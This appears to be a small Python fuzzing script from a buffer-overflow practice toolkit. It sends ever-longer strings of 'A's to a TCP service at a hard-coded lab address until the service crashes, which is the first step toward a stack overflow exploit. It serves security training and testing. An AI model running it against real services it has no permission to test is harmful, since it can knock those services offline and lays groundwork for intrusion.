#!/usr/bin/python3
# 2fuzz.py
# https://github.com/hungryrussian/bufferoverflowtoolkit

import sys, socket
from time import sleep

ip = "192.168.1.120"
port = 9999
command = ""

buffer = command + "A"*100

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((ip,port))
        s.recv(1024)
        print("Fuzzing with {} bytes".format(len(buffer) - len(command)))
        s.send(bytes(buffer, "latin-1"))
        s.recv(1024)

        buffer += "A"*100
        sleep(1)

    except:
        print("Fuzzing crashed at %s bytes" % str(len(buffer) - len(command)))
        sys.exit()
